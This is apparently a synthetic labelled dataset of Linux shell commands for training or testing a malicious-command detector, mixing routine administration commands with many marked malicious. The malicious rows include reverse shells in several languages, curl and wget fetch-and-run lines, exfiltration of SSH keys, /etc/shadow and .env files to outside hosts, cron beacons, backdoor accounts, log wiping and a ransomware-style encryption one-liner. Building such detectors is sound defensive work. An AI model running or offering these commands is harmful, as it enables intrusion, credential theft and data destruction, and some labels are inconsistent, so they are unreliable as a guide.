command,label,original_label,mitre_id
wget http://192.168.1.50:80/shell.sh -O /run/shm/shell.sh && chmod +x /run/shm/shell.sh && /run/shm/shell.sh,Malicious,Synthetic,Synthetic
dmidecode -t bios,Benign,Synthetic,Synthetic
yum install -y httpd,Benign,Synthetic,Synthetic
cat /proc/meminfo,Benign,Synthetic,Synthetic
rsync -avz /home/user/ /backup/user/,Benign,Synthetic,Synthetic
(crontab -l; echo '*/5 * * * * curl http://10.0.0.1/8080/beacon | bash') | crontab -,Malicious,Synthetic,Synthetic
kill -HUP $(pidof java),Benign,Synthetic,Synthetic
pip show numpy,Benign,Synthetic,Synthetic
cat ~/.bash_history,Context_Dependent,Synthetic,Synthetic
shuf -i 1-100 -n 5,Benign,Synthetic,Synthetic
w -h,Benign,Synthetic,Synthetic
nano /var/log/config.yaml,Benign,Synthetic,Synthetic
curl -s http://attacker.com/implant | sh,Malicious,Synthetic,Synthetic
vim /var/www/html/settings.json,Benign,Synthetic,Synthetic
"ps -eo pid,ppid,cmd,%mem,%cpu",Benign,Synthetic,Synthetic
docker ps,Benign,Synthetic,Synthetic
kubectl get svc,Benign,Synthetic,Synthetic
ls -la /etc/nginx/sites-enabled/,Benign,Synthetic,Synthetic
echo 'ssh-rsa AAAA... attacker' >> /root/.ssh/authorized_keys,Malicious,Synthetic,Synthetic
cat /proc/net/fib_trie | grep -o '[0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+',Malicious,Synthetic,Synthetic
find /home -type f -name '*.doc' -exec openssl enc -aes-256-cbc -salt -in {} -out {}.enc -k ransomkey \; -exec rm {} \;,Malicious,Synthetic,Synthetic
cat /etc/sysctl.conf,Benign,Synthetic,Synthetic
cat /etc/group,Context_Dependent,Synthetic,Synthetic
systemctl restart elasticsearch,Benign,Synthetic,Synthetic
cp /home/user/server.js /home/user/server.js.bak,Benign,Synthetic,Synthetic
base64 /root/.ssh/id_rsa | curl -d @- http://10.0.0.5:9090/,Malicious,Synthetic,Synthetic
ls /var/log/,Benign,Synthetic,Synthetic
curl -I https://internal-dns,Benign,Synthetic,Synthetic
chown nginx:nginx /home/user,Benign,Synthetic,Synthetic
ps aux | grep postgres,Benign,Synthetic,Synthetic
head -20 /var/log/syslog,Benign,Synthetic,Synthetic
git bisect start,Benign,Synthetic,Synthetic
docker-compose logs -f,Benign,Synthetic,Synthetic
yum update,Benign,Synthetic,Synthetic
grep -c 'ERROR' /var/log/syslog,Benign,Synthetic,Synthetic
curl http://10.20.30.40:443/rev.py | bash,Malicious,Synthetic,Synthetic
cp config.yaml config.yaml.bak,Benign,Synthetic,Synthetic
cat /etc/sudoers | nc 172.16.5.10 1234,Malicious,Synthetic,Synthetic
crontab -e,Benign,Synthetic,Synthetic
journalctl -u rsyslog --since '1 hour ago',Benign,Synthetic,Synthetic
pip show gunicorn,Benign,Synthetic,Synthetic
netstat -tlnp,Benign,Synthetic,Synthetic
kill -9 1,Context_Dependent,Synthetic,Synthetic
git add .,Benign,Synthetic,Synthetic
du -ah /etc/nginx | sort -rh | head -10,Benign,Synthetic,Synthetic
cargo update,Benign,Synthetic,Synthetic
curl http://172.16.5.10:80/dropper | bash,Malicious,Synthetic,Synthetic
cat /etc/shadow,Context_Dependent,Synthetic,Synthetic
mv /srv/www/requirements.txt.old /srv/www/requirements.txt,Benign,Synthetic,Synthetic
curl -s https://ifconfig.me,Benign,Synthetic,Synthetic
echo '/tmp/.implant &' >> /etc/rc.local,Malicious,Synthetic,Synthetic
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.20.30.40 9090 >/tmp/f,Malicious,Synthetic,Synthetic
nano /opt/services/server.js,Benign,Synthetic,Synthetic
ping6 -c 2 ::1,Benign,Synthetic,Synthetic
cat /var/www/html/.env,Malicious,Synthetic,Synthetic
history -c && history -w,Malicious,Synthetic,Synthetic
ssh -L 8080:localhost:8080 user@jump,Context_Dependent,Synthetic,Synthetic
cp /srv/www/requirements.txt /srv/www/requirements.txt.bak,Benign,Synthetic,Synthetic
journalctl -u haproxy --no-pager -n 20,Benign,Synthetic,Synthetic
ausearch -m avc -ts recent,Benign,Synthetic,Synthetic
LD_PRELOAD=/tmp/libevil.so /usr/bin/sudo,Malicious,Synthetic,Synthetic
date,Benign,Synthetic,Synthetic
ssh ubuntu@web-01,Benign,Synthetic,Synthetic
history -c,Benign,Synthetic,Synthetic
ls -la /var/www/,Benign,Synthetic,Synthetic
cat /etc/shadow | nc 10.0.0.1 9999,Malicious,Synthetic,Synthetic
cat /etc/master.passwd,Malicious,Synthetic,Synthetic
docker logs api,Benign,Synthetic,Synthetic
nikto -h http://10.0.0.25:80,Context_Dependent,Synthetic,Synthetic
mv /srv/www/app.py.old /srv/www/app.py,Benign,Synthetic,Synthetic
"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444",Malicious,Synthetic,Synthetic
chmod u+s /bin/bash,Malicious,Synthetic,Synthetic
cat ~/.bashrc,Benign,Synthetic,Synthetic
:(){ :|:& };:,Malicious,Synthetic,Synthetic
umask 022,Benign,Synthetic,Synthetic
wget http://10.10.14.3:9090/shell.sh -O /run/shm/shell.sh && chmod +x /run/shm/shell.sh && /run/shm/shell.sh,Malicious,Synthetic,Synthetic
nc -e /bin/bash 192.168.1.100 9001,Malicious,Synthetic,Synthetic
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.50 1337 >/tmp/f,Malicious,Synthetic,Synthetic
true,Benign,Synthetic,Synthetic
gradle test,Benign,Synthetic,Synthetic
pip install next,Benign,Synthetic,Synthetic
mv /usr/local/bin/requirements.txt.old /usr/local/bin/requirements.txt,Benign,Synthetic,Synthetic
chown root:root /home/user,Benign,Synthetic,Synthetic
cat ~/.mysql_history,Context_Dependent,Synthetic,Synthetic
du -ah /usr/local/bin | sort -rh | head -10,Benign,Synthetic,Synthetic
cp /var/lib/docker-compose.yml /var/lib/docker-compose.yml.bak,Benign,Synthetic,Synthetic
sha256sum -c checksums.txt,Benign,Synthetic,Synthetic
docker-compose restart web,Benign,Synthetic,Synthetic
grep -v '^#' /etc/apache2/apache2.conf,Benign,Synthetic,Synthetic
scp -r project/ user@server:/opt/,Benign,Synthetic,Synthetic
du -sh /home/user,Benign,Synthetic,Synthetic
sha256sum release.zip,Benign,Synthetic,Synthetic
cat /etc/passwd | nc 10.0.0.1 9999,Malicious,Synthetic,Synthetic
ssh -i ~/.ssh/id_rsa user@server,Benign,Synthetic,Synthetic
systemctl restart memcached,Benign,Synthetic,Synthetic
cat /proc/version,Benign,Synthetic,Synthetic
tar czf - /etc/ssh/ | curl -X POST -d @- http://10.0.0.1:8080/,Malicious,Synthetic,Synthetic
service --status-all,Benign,Synthetic,Synthetic
systemctl restart consul,Benign,Synthetic,Synthetic
grep -v '^#' /etc/mysql/my.cnf,Benign,Synthetic,Synthetic
pip install --upgrade pandas,Benign,Synthetic,Synthetic
kubectl apply -f deployment.yaml,Benign,Synthetic,Synthetic
cat /etc/nsswitch.conf,Benign,Synthetic,Synthetic
find /var/log -name '*.log' -exec truncate -s 0 {} \;,Malicious,Synthetic,Synthetic
"ruby -rsocket -e 'f=TCPSocket.open(""10.0.0.1"",4444).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",Malicious,Synthetic,Synthetic
nmap -sV 192.168.0.10,Context_Dependent,Synthetic,Synthetic
pip show boto3,Benign,Synthetic,Synthetic
nmap -sT 10.0.0.0/24,Context_Dependent,Synthetic,Synthetic
zcat /var/log/syslog.1.gz | tail -20,Benign,Synthetic,Synthetic
find . -name '*.pyc' -delete,Benign,Synthetic,Synthetic
nano /home/admin/Dockerfile,Benign,Synthetic,Synthetic
ls -lt /usr/local/bin | head -10,Benign,Synthetic,Synthetic
pip install fastapi,Benign,Synthetic,Synthetic
vim /tmp/docker-compose.yml,Benign,Synthetic,Synthetic
git gc,Benign,Synthetic,Synthetic
docker exec -it api bash,Benign,Synthetic,Synthetic
tail -100 /var/log/messages,Benign,Synthetic,Synthetic
who,Benign,Synthetic,Synthetic
docker system prune -f,Benign,Synthetic,Synthetic
systemctl is-active httpd,Benign,Synthetic,Synthetic
chown -R nginx:nginx /home/user,Benign,Synthetic,Synthetic
systemctl is-active redis,Benign,Synthetic,Synthetic
chmod 4755 /usr/local/bin/tool,Context_Dependent,Synthetic,Synthetic
nano /var/www/html/settings.json,Benign,Synthetic,Synthetic
cp /srv/www/nginx.conf /srv/www/nginx.conf.bak,Benign,Synthetic,Synthetic
vim /tmp/README.md,Benign,Synthetic,Synthetic
pip install --upgrade setuptools,Benign,Synthetic,Synthetic
curl -s http://172.16.0.50/implant -o /tmp/.hidden/.implant && bash /tmp/.hidden/.implant,Malicious,Synthetic,Synthetic
systemctl list-timers,Benign,Synthetic,Synthetic
"ansible all -i '10.0.0.2,' -m shell -a 'curl http://10.0.0.1/shell|bash'",Malicious,Synthetic,Synthetic
"socat TCP-LISTEN:1234,fork -",Context_Dependent,Synthetic,Synthetic
du -sh /var/lib,Benign,Synthetic,Synthetic
pip install uvicorn,Benign,Synthetic,Synthetic
cat /opt/app/.env,Malicious,Synthetic,Synthetic
journalctl -u mysql --since '1 hour ago',Benign,Synthetic,Synthetic
ls /usr/local/bin/,Benign,Synthetic,Synthetic
cp /home/deploy/deploy.sh /home/deploy/deploy.sh.bak,Benign,Synthetic,Synthetic
pip install --upgrade webpack,Benign,Synthetic,Synthetic
nmap -sT 192.168.1.0/24,Context_Dependent,Synthetic,Synthetic
journalctl -u prometheus --since '1 hour ago',Benign,Synthetic,Synthetic
iotop -bon1,Benign,Synthetic,Synthetic
grep -ri 'token' /opt/,Context_Dependent,Synthetic,Synthetic
nano /srv/www/backup.sh,Benign,Synthetic,Synthetic
ls -la /dev/shm/,Context_Dependent,Synthetic,Synthetic
echo '/tmp/.persist' >> ~/.bashrc,Malicious,Synthetic,Synthetic
nano /home/user/projects/server.js,Benign,Synthetic,Synthetic
ls -la /srv/www,Benign,Synthetic,Synthetic
base64 /root/.ssh/id_rsa | curl -d @- http://192.168.1.100:1337/,Malicious,Synthetic,Synthetic
echo $HOME,Benign,Synthetic,Synthetic
mv /var/lib/main.go.old /var/lib/main.go,Benign,Synthetic,Synthetic
git diff --staged,Benign,Synthetic,Synthetic
ss -s,Benign,Synthetic,Synthetic
npm install express,Benign,Synthetic,Synthetic
netstat -anp | grep LISTEN,Benign,Synthetic,Synthetic
ip neigh show,Benign,Synthetic,Synthetic
ls -la /home/user,Benign,Synthetic,Synthetic
last -5,Benign,Synthetic,Synthetic
gradle build,Benign,Synthetic,Synthetic
cat /etc/resolv.conf,Benign,Synthetic,Synthetic
env | grep -i key,Context_Dependent,Synthetic,Synthetic
ssh admin@web-01 'uptime',Benign,Synthetic,Synthetic
nano /home/user/monitor.py,Benign,Synthetic,Synthetic
python -m SimpleHTTPServer 9000,Context_Dependent,Synthetic,Synthetic
pip show celery,Benign,Synthetic,Synthetic
ss -tlnp,Benign,Synthetic,Synthetic
chown deploy:deploy /home/user/projects,Benign,Synthetic,Synthetic
md5sum release.zip,Benign,Synthetic,Synthetic
grep -ri 'api_key' /var/www/,Context_Dependent,Synthetic,Synthetic
grep -ri 'secret' /opt/,Context_Dependent,Synthetic,Synthetic
curl -s http://10.0.0.1/payload.sh,Context_Dependent,Synthetic,Synthetic
pip install webpack,Benign,Synthetic,Synthetic
wget http://10.100.200.1:8080/payload.sh -O /tmp/payload.sh && chmod +x /tmp/payload.sh && /tmp/payload.sh,Malicious,Synthetic,Synthetic
journalctl -u kibana --since '1 hour ago',Benign,Synthetic,Synthetic
top -bn1 | head -20,Benign,Synthetic,Synthetic
ssh admin@staging 'uptime',Benign,Synthetic,Synthetic
systemctl restart mysql,Benign,Synthetic,Synthetic
ls -la /root/,Context_Dependent,Synthetic,Synthetic
pip3 install django gunicorn,Benign,Synthetic,Synthetic
bash -i >& /dev/tcp/192.168.1.100/9090 0>&1,Malicious,Synthetic,Synthetic
kill -HUP $(pidof postgres),Benign,Synthetic,Synthetic
nc -zv 172.16.5.10 1-1000,Context_Dependent,Synthetic,Synthetic
journalctl -u redis --since '1 hour ago',Benign,Synthetic,Synthetic
vim /home/user/server.js,Benign,Synthetic,Synthetic
cat /proc/net/arp,Context_Dependent,Synthetic,Synthetic
df -h /var/www/html,Benign,Synthetic,Synthetic
"socat TCP-LISTEN:4444,reuseaddr,fork -",Context_Dependent,Synthetic,Synthetic
du -sh /home/deploy,Benign,Synthetic,Synthetic
groups $USER,Benign,Synthetic,Synthetic
iconv -f UTF-8 -t ASCII input.txt,Benign,Synthetic,Synthetic
nc -zv 192.168.1.100 80,Context_Dependent,Synthetic,Synthetic
mv /home/user/healthcheck.sh.old /home/user/healthcheck.sh,Benign,Synthetic,Synthetic
journalctl -u rabbitmq-server --no-pager -n 20,Benign,Synthetic,Synthetic
ls -lt /var/www/html | head -10,Benign,Synthetic,Synthetic
chmod 644 package.json,Benign,Synthetic,Synthetic
"lua -e 'local s=require(""socket"");local t=assert(s.tcp());t:connect(""10.0.0.1"",4444);os.execute(""/bin/sh -i <&3 >&3 2>&3"")'",Malicious,Synthetic,Synthetic
insmod /tmp/rootkit.ko,Malicious,Synthetic,Synthetic
git cherry-pick abc1234,Benign,Synthetic,Synthetic
nano /srv/www/requirements.txt,Benign,Synthetic,Synthetic
grep -c 'WARN' /var/log/syslog,Benign,Synthetic,Synthetic
timedatectl,Benign,Synthetic,Synthetic
make,Benign,Synthetic,Synthetic
(crontab -l; echo '*/5 * * * * curl http://10.0.0.1/9090/beacon | bash') | crontab -,Malicious,Synthetic,Synthetic
dd if=/dev/zero of=/tmp/testfile bs=1M count=100,Benign,Synthetic,Synthetic
grep -r password /etc/,Context_Dependent,Synthetic,Synthetic
shred -zu /var/log/auth.log,Malicious,Synthetic,Synthetic
gunzip access.log.gz,Benign,Synthetic,Synthetic
ssh deploy@production 'uptime',Benign,Synthetic,Synthetic
mv /var/log/package.json.old /var/log/package.json,Benign,Synthetic,Synthetic
wget http://10.10.14.3:9090/rev.py -O /tmp/rev.py && chmod +x /tmp/rev.py && /tmp/rev.py,Malicious,Synthetic,Synthetic
sftp -b batchfile user@server,Benign,Synthetic,Synthetic
kubectl rollout status deployment/web,Benign,Synthetic,Synthetic
sha256sum package.deb,Benign,Synthetic,Synthetic
python3 -m pytest tests/,Benign,Synthetic,Synthetic
getent group $USER,Benign,Synthetic,Synthetic
mv /tmp/README.md.old /tmp/README.md,Benign,Synthetic,Synthetic
grep -i 'refused' /var/log/syslog,Benign,Synthetic,Synthetic
evil-winrm -i 10.0.0.2 -u admin -p password,Malicious,Synthetic,Synthetic
vim /srv/www/app.py,Benign,Synthetic,Synthetic
dmidecode -t system,Benign,Synthetic,Synthetic
nc -lvnp 6666,Context_Dependent,Synthetic,Synthetic
nano /tmp/docker-compose.yml,Benign,Synthetic,Synthetic
cat /etc/fstab | grep -v '^#',Malicious,Synthetic,Synthetic
docker images -a,Benign,Synthetic,Synthetic
grep -i 'timeout' /var/log/syslog,Benign,Synthetic,Synthetic
/proc/1234/status,Benign,Synthetic,Synthetic
kubectl logs web-abc123,Benign,Synthetic,Synthetic
vim /opt/services/settings.json,Benign,Synthetic,Synthetic
systemctl is-active kibana,Benign,Synthetic,Synthetic
date +%s,Benign,Synthetic,Synthetic
mtr --report google.com,Benign,Synthetic,Synthetic
cat ~/.profile,Benign,Synthetic,Synthetic
journalctl -u grafana-server --since '1 hour ago',Benign,Synthetic,Synthetic
tcpdump -i any -c 100 -nn,Context_Dependent,Synthetic,Synthetic
pip show typescript,Benign,Synthetic,Synthetic
cp /tmp/Makefile /tmp/Makefile.bak,Benign,Synthetic,Synthetic
nohup ./monitor.sh &,Context_Dependent,Synthetic,Synthetic
grep -c 'refused' /var/log/syslog,Benign,Synthetic,Synthetic
realpath ./relative/path,Benign,Synthetic,Synthetic
pip show next,Benign,Synthetic,Synthetic
nano /usr/local/bin/requirements.txt,Benign,Synthetic,Synthetic
strace -c ls /tmp,Benign,Synthetic,Synthetic
curl -I https://8.8.8.8,Benign,Synthetic,Synthetic
tmux new -s work,Benign,Synthetic,Synthetic
find / -name '*.kdbx' 2>/dev/null,Malicious,Synthetic,Synthetic
dirb http://target.com,Context_Dependent,Synthetic,Synthetic
python3 -m http.server 8080,Context_Dependent,Synthetic,Synthetic
du -ah /opt/app | sort -rh | head -10,Benign,Synthetic,Synthetic
find / -xdev -type f -size +100M,Benign,Synthetic,Synthetic
nmcli general status,Benign,Synthetic,Synthetic
python3 -m http.server 80,Context_Dependent,Synthetic,Synthetic
docker-compose ps,Benign,Synthetic,Synthetic
lsusb,Benign,Synthetic,Synthetic
uptime -p,Benign,Synthetic,Synthetic
cat /proc/1/environ,Context_Dependent,Synthetic,Synthetic
echo 'c' > /proc/sysrq-trigger,Malicious,Synthetic,Synthetic
ps aux | grep node,Benign,Synthetic,Synthetic
du -ah /var/www/html | sort -rh | head -10,Benign,Synthetic,Synthetic
journalctl -u nginx --since '1 hour ago',Benign,Synthetic,Synthetic
iwconfig,Benign,Synthetic,Synthetic
systemctl restart prometheus,Benign,Synthetic,Synthetic
mv /tmp/docker-compose.yml.old /tmp/docker-compose.yml,Benign,Synthetic,Synthetic
cp /home/user/projects/config.yaml /home/user/projects/config.yaml.bak,Benign,Synthetic,Synthetic
echo $USER,Benign,Synthetic,Synthetic
journalctl -u consul --since '1 hour ago',Benign,Synthetic,Synthetic
mv /var/www/monitor.py.old /var/www/monitor.py,Benign,Synthetic,Synthetic
cp /home/user/monitor.py /home/user/monitor.py.bak,Benign,Synthetic,Synthetic
git status,Benign,Synthetic,Synthetic
ls -lt /home/deploy | head -10,Benign,Synthetic,Synthetic
cp /var/www/html/backup.sh /var/www/html/backup.sh.bak,Benign,Synthetic,Synthetic
lsof +D /var/log,Benign,Synthetic,Synthetic
curl --data-binary @/root/.ssh/id_rsa http://10.0.0.1:9090/keys,Malicious,Synthetic,Synthetic
docker logs -f app,Benign,Synthetic,Synthetic
bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1',Malicious,Synthetic,Synthetic
ls -lt /tmp | head -10,Benign,Synthetic,Synthetic
hostnamectl,Benign,Synthetic,Synthetic
systemctl daemon-reload,Benign,Synthetic,Synthetic
apt list --installed,Benign,Synthetic,Synthetic
anacron -T,Benign,Synthetic,Synthetic
vim /var/log/index.html,Benign,Synthetic,Synthetic
arp -a,Benign,Synthetic,Synthetic
mv /var/log/config.yaml.old /var/log/config.yaml,Benign,Synthetic,Synthetic
mv /var/www/nginx.conf.old /var/www/nginx.conf,Benign,Synthetic,Synthetic
cp /var/log/config.yaml /var/log/config.yaml.bak,Benign,Synthetic,Synthetic
mv /opt/app/Dockerfile.old /opt/app/Dockerfile,Benign,Synthetic,Synthetic
dnf update,Benign,Synthetic,Synthetic
chmod 600 healthcheck.sh,Benign,Synthetic,Synthetic
grep -ri 'secret' /etc/,Context_Dependent,Synthetic,Synthetic
wget http://10.20.30.40:443/rev.py -O /tmp/.hidden/rev.py && chmod +x /tmp/.hidden/rev.py && /tmp/.hidden/rev.py,Malicious,Synthetic,Synthetic
brew upgrade,Benign,Synthetic,Synthetic
pypykatz lsa minidump lsass.dmp,Malicious,Synthetic,Synthetic
lsof -i -P -n | grep LISTEN,Benign,Synthetic,Synthetic
groupdel testgroup,Benign,Synthetic,Synthetic
(crontab -l; echo '*/5 * * * * curl http://172.16.0.1/9001/beacon | bash') | crontab -,Malicious,Synthetic,Synthetic
systemctl restart fail2ban,Benign,Synthetic,Synthetic
nslookup google.com,Benign,Synthetic,Synthetic
curl http://10.100.200.1:8080/payload.sh | bash,Malicious,Synthetic,Synthetic
"lsblk -o NAME,SIZE,TYPE,MOUNTPOINT",Benign,Synthetic,Synthetic
lsb_release -a,Benign,Synthetic,Synthetic
cat /proc/loadavg,Benign,Synthetic,Synthetic
python -m SimpleHTTPServer 8000,Context_Dependent,Synthetic,Synthetic
curl -s http://10.20.30.40/rev.py -o /tmp/.hidden/.rev.py && bash /tmp/.hidden/.rev.py,Malicious,Synthetic,Synthetic
"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((""192.168.1.100"",9090));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",Malicious,Synthetic,Synthetic
ls /opt/app/,Benign,Synthetic,Synthetic
systemctl is-active nomad,Benign,Synthetic,Synthetic
cmake ..,Benign,Synthetic,Synthetic
unalias ll,Benign,Synthetic,Synthetic
getent passwd $USER,Benign,Synthetic,Synthetic
nano /opt/app/Dockerfile,Benign,Synthetic,Synthetic
pgrep -la sshd,Benign,Synthetic,Synthetic
docker exec -it db bash,Benign,Synthetic,Synthetic
dig internal-dns,Benign,Synthetic,Synthetic
find . -name '*.py' -type f,Benign,Synthetic,Synthetic
cp /opt/services/deploy.sh /opt/services/deploy.sh.bak,Benign,Synthetic,Synthetic
du -sh /opt/app,Benign,Synthetic,Synthetic
mvn clean install,Benign,Synthetic,Synthetic
cat /opt/app/.env | nc 10.20.30.40 1337,Malicious,Synthetic,Synthetic
cat /proc/self/environ,Context_Dependent,Synthetic,Synthetic
cp /dev/shm/.proc/backdoor /usr/local/bin/.update && chmod +x /usr/local/bin/.update,Malicious,Synthetic,Synthetic
curl http://172.16.0.50:8443/implant | bash,Malicious,Synthetic,Synthetic
nano /etc/nginx/monitor.py,Benign,Synthetic,Synthetic
systemctl restart vault,Benign,Synthetic,Synthetic
nc -lvnp 9090,Context_Dependent,Synthetic,Synthetic
mv /var/lib/package.json.old /var/lib/package.json,Benign,Synthetic,Synthetic
ssh admin@app-01 'uptime',Benign,Synthetic,Synthetic
ssh ubuntu@db-01,Benign,Synthetic,Synthetic
ping -c 4 api.company.com,Benign,Synthetic,Synthetic
du -sh /usr/local/bin,Benign,Synthetic,Synthetic
nmcli device status,Benign,Synthetic,Synthetic
chmod 644 README.md,Benign,Synthetic,Synthetic
ls -laR /etc/nginx/,Benign,Synthetic,Synthetic
hostname -s,Benign,Synthetic,Synthetic
git tag -l 'v*',Benign,Synthetic,Synthetic
systemctl status cron,Benign,Synthetic,Synthetic
systemctl restart docker,Benign,Synthetic,Synthetic
"awk 'BEGIN {s = ""/inet/tcp/0/10.0.0.1/4444""; while(42) { printf ""> "" |& s; s |& getline c; if (c) { while ((c |& getline line) > 0) print line |& s; close(c) } } }'",Malicious,Synthetic,Synthetic
openssl enc -aes-256-cbc -in file.txt -out file.enc,Context_Dependent,Synthetic,Synthetic
sshpass -p 'password123' ssh root@10.0.0.2,Malicious,Synthetic,Synthetic
ls /var/lib/,Benign,Synthetic,Synthetic
kill -HUP 1234,Benign,Synthetic,Synthetic
iptables -L -v --line-numbers,Benign,Synthetic,Synthetic
ip addr,Benign,Synthetic,Synthetic
g++ -std=c++17 -o app app.cpp,Benign,Synthetic,Synthetic
wget http://172.16.5.10:443/implant -O /tmp/implant && chmod +x /tmp/implant && /tmp/implant,Malicious,Synthetic,Synthetic
grep -ri 'token' /home/,Context_Dependent,Synthetic,Synthetic
journalctl -u sshd --since '1 hour ago',Benign,Synthetic,Synthetic
python3 manage.py migrate,Benign,Synthetic,Synthetic
stat /var/log/syslog,Benign,Synthetic,Synthetic
cat /etc/default/grub,Benign,Synthetic,Synthetic
df -h /opt/app,Benign,Synthetic,Synthetic
unzip archive.zip -d /tmp/output,Benign,Synthetic,Synthetic
chown www-data:www-data /opt/services,Benign,Synthetic,Synthetic
kubectl top nodes,Benign,Synthetic,Synthetic
su - postgres,Benign,Synthetic,Synthetic
lsof -i :80,Benign,Synthetic,Synthetic
ping -c 4 google.com,Benign,Synthetic,Synthetic
docker logs cache,Benign,Synthetic,Synthetic
nano /srv/www/Makefile,Benign,Synthetic,Synthetic
docker logs --tail 100 api,Benign,Synthetic,Synthetic
systemctl status consul,Benign,Synthetic,Synthetic
nano /var/log/package.json,Benign,Synthetic,Synthetic
wget -q -O - https://example.com | head -1,Benign,Synthetic,Synthetic
systemctl restart redis,Benign,Synthetic,Synthetic
kubectl top pods,Benign,Synthetic,Synthetic
cp /home/deploy/requirements.txt /home/deploy/requirements.txt.bak,Benign,Synthetic,Synthetic
hostnamectl status,Benign,Synthetic,Synthetic
ncat -lvnp 7777,Context_Dependent,Synthetic,Synthetic
mkdir -p ~/.ssh && echo 'ssh-rsa AAAA... attacker@host' >> ~/.ssh/authorized_keys,Malicious,Synthetic,Synthetic
nc -w 3 host 9999,Context_Dependent,Synthetic,Synthetic
ls -lt /home/user | head -10,Benign,Synthetic,Synthetic
"socat TCP-LISTEN:7777,fork -",Context_Dependent,Synthetic,Synthetic
ss -a,Benign,Synthetic,Synthetic
"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((""192.168.1.50"",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",Malicious,Synthetic,Synthetic
"php -r '$sock=fsockopen(""10.0.0.1"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",Malicious,Synthetic,Synthetic
pip show lodash,Benign,Synthetic,Synthetic
nano /var/log/index.html,Benign,Synthetic,Synthetic
journalctl -u httpd --since '1 hour ago',Benign,Synthetic,Synthetic
systemctl is-active fail2ban,Benign,Synthetic,Synthetic
base64 /etc/passwd | curl -d @- http://10.0.0.5:8080/,Malicious,Synthetic,Synthetic
docker logs -f proxy,Benign,Synthetic,Synthetic
nc -zv 192.168.1.100 22,Context_Dependent,Synthetic,Synthetic
journalctl -u nginx,Benign,Synthetic,Synthetic
history | tail -20,Benign,Synthetic,Synthetic
pgrep -la nginx,Benign,Synthetic,Synthetic
chmod 700 app.py,Benign,Synthetic,Synthetic
openssl version,Benign,Synthetic,Synthetic
cat /etc/passwd,Context_Dependent,Synthetic,Synthetic
at now + 5 minutes,Benign,Synthetic,Synthetic
nmap -sV 192.168.1.1,Context_Dependent,Synthetic,Synthetic
systemctl is-active cron,Benign,Synthetic,Synthetic
yq '.services' docker-compose.yml,Benign,Synthetic,Synthetic
nc -zv 172.16.5.10 80,Context_Dependent,Synthetic,Synthetic
(crontab -l; echo '*/5 * * * * curl http://172.16.0.50/5555/beacon | bash') | crontab -,Malicious,Synthetic,Synthetic
psexec.py admin:password@10.0.0.2,Malicious,Synthetic,Synthetic
cp /opt/services/README.md /opt/services/README.md.bak,Benign,Synthetic,Synthetic
who -r,Benign,Synthetic,Synthetic
systemctl stop apache2,Benign,Synthetic,Synthetic
tcpdump -i eth0 -w capture.pcap,Context_Dependent,Synthetic,Synthetic
ls -la /etc/nginx,Benign,Synthetic,Synthetic
uptime -s,Benign,Synthetic,Synthetic
systemctl is-active consul,Benign,Synthetic,Synthetic
md5sum firmware.bin,Benign,Synthetic,Synthetic
nmap -sV 192.168.1.50,Context_Dependent,Synthetic,Synthetic
command -v docker,Benign,Synthetic,Synthetic
docker exec -it worker bash,Benign,Synthetic,Synthetic
cp /tmp/main.go /tmp/main.go.bak,Benign,Synthetic,Synthetic
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 1234 >/tmp/f,Malicious,Synthetic,Synthetic
pip install --upgrade express,Benign,Synthetic,Synthetic
echo 'backdoor:password123' | chpasswd,Malicious,Synthetic,Synthetic
mv /srv/www/Makefile.old /srv/www/Makefile,Benign,Synthetic,Synthetic
git branch -d old-branch,Benign,Synthetic,Synthetic
python3 LaZagne.py all,Malicious,Synthetic,Synthetic
lsblk,Benign,Synthetic,Synthetic
nano /opt/services/settings.json,Benign,Synthetic,Synthetic
chown root:root /etc/nginx/nginx.conf,Benign,Synthetic,Synthetic
